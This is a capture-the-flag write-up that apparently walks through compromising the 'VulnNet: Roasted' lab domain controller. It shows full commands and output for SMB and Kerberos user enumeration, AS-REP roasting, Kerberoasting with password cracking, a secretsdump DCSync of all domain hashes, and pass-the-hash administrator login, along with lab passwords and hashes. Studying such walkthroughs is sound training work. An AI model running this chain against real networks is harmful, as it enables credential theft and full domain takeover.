# VulnNet: Roasted

![A full scheme to get user and system.](<../../.gitbook/assets/image (2).png>)

## Enumeration

### port  scan - service discovery

```
Nmap scan report for 10.10.125.220
Host is up (0.096s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2022-02-11 21:06:12Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open     mc-nmf        .NET Message Framing
49668/tcp open     msrpc         Microsoft Windows RPC
49669/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open     msrpc         Microsoft Windows RPC
49673/tcp open     msrpc         Microsoft Windows RPC
49692/tcp open     msrpc         Microsoft Windows RPC
49783/tcp filtered unknown
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Nmap also determined hostname - `WIN-2BO8M1OE1M1`.

### smb

```
smbclient -N -L \\\\10.10.125.220\\                                                                                                                                                                                               130 ⨯

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.125.220 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Check each share:

```
┌──(root💀kali)-[~/machines/VulnNet: Roasted/enumeration/smb]
└─# smbclient -N \\\\10.10.125.220\\ADMIN$
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/machines/VulnNet: Roasted/enumeration/smb]
└─# smbclient -N \\\\10.10.125.220\\C$                                                                                                                                                                                                  1 ⨯
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/machines/VulnNet: Roasted/enumeration/smb]
└─# smbclient -N \\\\10.10.125.220\\IPC$                                                                                                                                                                                                1 ⨯
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_INVALID_INFO_CLASS listing \*
smb: \> exit
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/machines/VulnNet: Roasted/enumeration/smb]
└─# smbclient -N \\\\10.10.125.220\\NETLOGON
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
smb: \> exit
                                                                                                                                                                                                                                
┌──(root💀kali)-[~/machines/VulnNet: Roasted/enumeration/smb]
└─# smbclient -N \\\\10.10.125.220\\SYSVOL                                                                                                                                                                                            130 ⨯
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
smb: \> exit
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/machines/VulnNet: Roasted/enumeration/smb]
└─# smbclient -N \\\\10.10.125.220\\VulnNet-Business-Anonymous
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Mar 12 21:46:40 2021
  ..                                  D        0  Fri Mar 12 21:46:40 2021
  Business-Manager.txt                A      758  Thu Mar 11 20:24:34 2021
  Business-Sections.txt               A      654  Thu Mar 11 20:24:34 2021
  Business-Tracking.txt               A      471  Thu Mar 11 20:24:34 2021

                8771839 blocks of size 4096. 4527437 blocks available
smb: \> exit
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/machines/VulnNet: Roasted/enumeration/smb]
└─# smbclient -N \\\\10.10.125.220\\VulnNet-Enterprise-Anonymous
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Mar 12 21:46:40 2021
  ..                                  D        0  Fri Mar 12 21:46:40 2021
  Enterprise-Operations.txt           A      467  Thu Mar 11 20:24:34 2021
  Enterprise-Safety.txt               A      503  Thu Mar 11 20:24:34 2021
  Enterprise-Sync.txt                 A      496  Thu Mar 11 20:24:34 2021

                8771839 blocks of size 4096. 4525617 blocks available
smb: \>
```

From the files above we will extract full names of employees:

> Jack Goldenhand
>
> Tony Skid
>
> Johnny Leet

Maybe we can use it in future attacks.

With `enum4linux -a <ip-address> -v` we get Domain Name and SID:

```
 ============================================ 
|    Getting domain SID for 10.10.125.220    |
 ============================================ 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Domain Name: VULNNET-RST
Domain Sid: S-1-5-21-1589833671-435344116-4136949213
[+] Host is part of a domain (not a workgroup)

```

### kerberos

Trying to enumerate usernames with kerbrute tool which perform first step of kerberos authentication - AS REQ. A list of usernames is from `SecLists/Usernames` repository.

```
./kerbrute_linux_amd64 userenum --dc 10.10.125.220 -d VULNNET-RST ~/Downloads/names.txt                                       

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/11/22 - Ronnie Flathers @ropnop

2022/02/11 16:39:04 >  Using KDC(s):
2022/02/11 16:39:04 >   10.10.125.220:88

2022/02/11 16:40:35 >  Done! Tested 10177 usernames (0 valid) in 91.162 seconds
```

I took the names from smb and wrote a simple usernames in different formats. Then, I ran kerbrute again:

```
┌──(root💀kali)-[~/machines/VulnNet: Roasted/enumeration/creds]
└─# cat created_usernames.txt 
Jack.Goldenhand
Tony.Skid
Johnny.Leet
J.Goldenhand
T.Skid
J.Leet
Jack
Tony
Johnny
j-goldenhand
t-skid
j-leet
jack-goldenhand
tony-skid
johnny-leet
jackgoldenhand
tonyskid
johnnyleet
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/machines/VulnNet: Roasted/enumeration/creds]
└─# /opt/kerbrute/dist/kerbrute_linux_amd64 userenum --dc 10.10.246.213 -d vulnnet-rst.local created_usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/12/22 - Ronnie Flathers @ropnop

2022/02/12 16:44:14 >  Using KDC(s):
2022/02/12 16:44:14 >   10.10.246.213:88

2022/02/12 16:44:14 >  [+] VALID USERNAME:       j-goldenhand@vulnnet-rst.local
2022/02/12 16:44:14 >  [+] VALID USERNAME:       j-leet@vulnnet-rst.local
2022/02/12 16:44:14 >  [+] t-skid has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$t-skid@VULNNET-RST.LOCAL:1e254ca99f806906fbbbf7688efb12b7$73994d985cc647510b5ab4790b58b5458a3278fe4997936912c6ceef245839d476ecd6a54b0b41109b5a7ecb06455ef7135ea574f696dd73c261519850a16a10d797553ca5481e2c7fe150b418b498995c519d786fbbd1df7fce5f1928605ca9fdd195c940847bd4c4c8c5515bd64032bc271f61cca3deb9174ceefa39b77ab87cf82b6aa539cd28874c108be3c7aef79d0d36264c7df23e59354cddfda0840f1b8ac30ba5338111691c838f476fa8c471c5ef4b7c23ef36520ed62d2b1a6a999b94a69d8d2fa95cafe43fe9e1b447534f825a910690ab268edb9dfcf864f73fb64eb4dcc24135a7000d4322efba300ffca356b7547a1e7886ba3e7798b329bd7079e5bdc202a1fd176f                                                                                                        
2022/02/12 16:44:14 >  [+] VALID USERNAME:       t-skid@vulnnet-rst.local
2022/02/12 16:44:14 >  Done! Tested 18 usernames (3 valid) in 0.211 seconds
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/machines/VulnNet: Roasted/enumeration/creds]
└─# 

```

kerbrute will perform ASREPRoast attack if the account has `DONT_REQ_PREAUTH`attribute set. So, we found user like that and we can crack encrypted part of AS\_REP and get the user password.

### Stage 2: smb

I dumped all from IPC$ with t-skid's creds. It contains directory with a script \`ResetPassword.vbs\`.

Inside the script we have a new creds:

```visual-basic
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
```

Tried again kerbrute and got that this user is legitimate&#x20;

```
/opt/kerbrute/dist/kerbrute_linux_amd64 userenum --dc 10.10.246.213 -d vulnnet-rst.local ../../../creds/created_usernames.txt                   

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/12/22 - Ronnie Flathers @ropnop

2022/02/12 17:15:51 >  Using KDC(s):
2022/02/12 17:15:51 >   10.10.246.213:88

2022/02/12 17:15:51 >  [+] VALID USERNAME:       a-whitehat@vulnnet-rst.local
2022/02/12 17:15:51 >  Done! Tested 1 usernames (1 valid) in 0.087 seconds
```

## Gaining access

### t-skid hash cracking

For some reason, john and hashcat don't want to crack the hash from kerbrute, so, let's use impacket tool to get the hash again:

```
GetNPUsers.py -no-pass -dc-ip 10.10.246.213 -request -usersfile created_usernames.txt vulnnet-rst/10.10.246.213 -format john -outputfile hashes                                                                                     2 ⨯
Impacket v0.9.25.dev1+20220203.155819.ed7082cd - Copyright 2021 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

```
john -w=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 XOP 4x2])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj072889*        ($krb5asrep$t-skid@VULNNET-RST)     
1g 0:00:00:04 DONE (2022-02-12 17:03) 0.2500g/s 794688p/s 794688c/s 794688C/s tj3929..tizslk51
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now, we're cool. `tj072889*`. But unfortunately, we don't have a winrm access:

```
evil-winrm -i 10.10.246.213 -u t-skid -p "tj072889*"         

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
```

Well, I return to enumeration.

### Stage 2: winrm

After obtained a-whitehat creds I ran evil-winrm again:

```
evil-winrm -i 10.10.246.213 -u "a-whitehat" -p "bNdKVkjv3RR9ht"                                                                                                                                                                   130 ⨯

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\a-whitehat\Documents>
```

This user has access to the home dir of `enterprise-core-vn`. And it contain a user flag.&#x20;

### Kerberoasting

This account `enterprise-core-vn` seems to be service account. Let's find out it with kerberoasting attack:

```
GetUserSPNs.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht -dc-ip 10.10.246.213 -request -outputfile hashes
Impacket v0.9.25.dev1+20220203.155819.ed7082cd - Copyright 2021 SecureAuth Corporation

ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 14:45:09.913979  2021-03-13 18:41:17.987528            
```

Kerberoasting attack is a simple step in kerberos authentication...If we know the user creds we can enumerate SPN(ServicePrincipalNames) on the domain. Why we can do that? Because TGS\_REQ _contains field SPN and TGS\_REP has a TGS key to access service(SPN). This TGS key is encrypted with service owner hash, which is our \`enterprise-core-vn\`._

So, this account is a service account for CIFS or smb. We saved it hash, let's crack it with john:

```
john -w=/usr/share/wordlists/rockyou.txt hashes                                                                                                                                                                                   130 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ry=ibfkfv,s6h,   (?)     
1g 0:00:00:03 DONE (2022-02-12 17:31) 0.2808g/s 1154Kp/s 1154Kc/s 1154KC/s ryan fm..ry-ray
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now, we have this account too and, I think, this section is complete.

## Privilege escalation

### a-whitehat permissions

As `a-whitehat` we already have administrators group, but we don't have access to flag:

```
*Evil-WinRM* PS C:\Users\a-whitehat\Documents> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== =============================================
vulnnet-rst\a-whitehat S-1-5-21-1589833671-435344116-4136949213-1105


GROUP INFORMATION
-----------------

Group Name                                         Type             SID                                          Attributes
================================================== ================ ============================================ ===============================================================
Everyone                                           Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                      Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                             Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
VULNNET-RST\Domain Admins                          Group            S-1-5-21-1589833671-435344116-4136949213-512 Mandatory group, Enabled by default, Enabled group
VULNNET-RST\Denied RODC Password Replication Group Alias            S-1-5-21-1589833671-435344116-4136949213-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level               Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\a-whitehat\Documents>
```

### NTDS.dit dumping

With this permissions, we can dump all hashes and kerberos keys from NTDS.dit(which is AD creds database) on machine with impacket tool `secretsdump.py`:

```
secretsdump.py -dc-ip 10.10.53.190 -just-dc vulnnet-rst/a-whitehat:"bNdKVkjv3RR9ht"@10.10.53.190   
Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7633f01273fc92450b429d6067d1ca32:::
vulnnet-rst.local\enterprise-core-vn:1104:aad3b435b51404eeaad3b435b51404ee:8752ed9e26e6823754dce673de76ddaf:::
vulnnet-rst.local\a-whitehat:1105:aad3b435b51404eeaad3b435b51404ee:1bd408897141aa076d62e9bfc1a5956b:::
vulnnet-rst.local\t-skid:1109:aad3b435b51404eeaad3b435b51404ee:49840e8a32937578f8c55fdca55ac60b:::
vulnnet-rst.local\j-goldenhand:1110:aad3b435b51404eeaad3b435b51404ee:1b1565ec2b57b756b912b5dc36bc272a:::
vulnnet-rst.local\j-leet:1111:aad3b435b51404eeaad3b435b51404ee:605e5542d42ea181adeca1471027e022:::
WIN-2BO8M1OE1M1$:1000:aad3b435b51404eeaad3b435b51404ee:c308f736b54722c5603caf57a30e0e97:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:7f9adcf2cb65ebb5babde6ec63e0c8165a982195415d81376d1f4ae45072ab83
Administrator:aes128-cts-hmac-sha1-96:d9d0cc6b879ca5b7cfa7633ffc81b849
Administrator:des-cbc-md5:52d325cb2acd8fc1
krbtgt:aes256-cts-hmac-sha1-96:a27160e8a53b1b151fa34f45524a07eb9899ebdf0051b20d677f0c3b518885bd
krbtgt:aes128-cts-hmac-sha1-96:75c22aac8f2b729a3a5acacec729e353
krbtgt:des-cbc-md5:1357f2e9d3bc0bd3
vulnnet-rst.local\enterprise-core-vn:aes256-cts-hmac-sha1-96:9da9e2e1e8b5093fb17b9a4492653ceab4d57a451bd41de36b7f6e06e91e98f3
vulnnet-rst.local\enterprise-core-vn:aes128-cts-hmac-sha1-96:47ca3e5209bc0a75b5622d20c4c81d46
vulnnet-rst.local\enterprise-core-vn:des-cbc-md5:200e0102ce868016
vulnnet-rst.local\a-whitehat:aes256-cts-hmac-sha1-96:f0858a267acc0a7170e8ee9a57168a0e1439dc0faf6bc0858a57687a504e4e4c
vulnnet-rst.local\a-whitehat:aes128-cts-hmac-sha1-96:3fafd145cdf36acaf1c0e3ca1d1c5c8d
vulnnet-rst.local\a-whitehat:des-cbc-md5:028032c2a8043ddf
vulnnet-rst.local\t-skid:aes256-cts-hmac-sha1-96:a7d2006d21285baee8e46454649f3bd4a1790c7f4be7dd0ce72360dc6c962032
vulnnet-rst.local\t-skid:aes128-cts-hmac-sha1-96:8bdfe91cca8b16d1b3b3fb6c02565d16
vulnnet-rst.local\t-skid:des-cbc-md5:25c2739dcb646bfd
vulnnet-rst.local\j-goldenhand:aes256-cts-hmac-sha1-96:fc08aeb44404f23ff98ebc3aba97242155060928425ec583a7f128a218e4c5ad
vulnnet-rst.local\j-goldenhand:aes128-cts-hmac-sha1-96:7d218a77c73d2ea643779ac9b125230a
vulnnet-rst.local\j-goldenhand:des-cbc-md5:c4e65d49feb63180
vulnnet-rst.local\j-leet:aes256-cts-hmac-sha1-96:1327c55f2fa5e4855d990962d24986b63921bd8a10c02e862653a0ac44319c62
vulnnet-rst.local\j-leet:aes128-cts-hmac-sha1-96:f5d92fe6dc0f8e823f229fab824c1aa9
vulnnet-rst.local\j-leet:des-cbc-md5:0815580254a49854
WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:a3afc88471653bb5ef617a8e8983205cc45ee232defe36169e549b8a79479c44
WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:f3e6ff6cc5113a75f35afae7008a66ff
WIN-2BO8M1OE1M1$:des-cbc-md5:3bdf456be5f72cd6
[*] Cleaning up... 

```

Now, with obtained administrator's hash, we perform Pass-The-Hash attack and log in as administrator:

```
evil-winrm -i 10.10.53.190 -u "administrator" -H "c2597747aa5e43022a3a3049a3c3b09d"

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
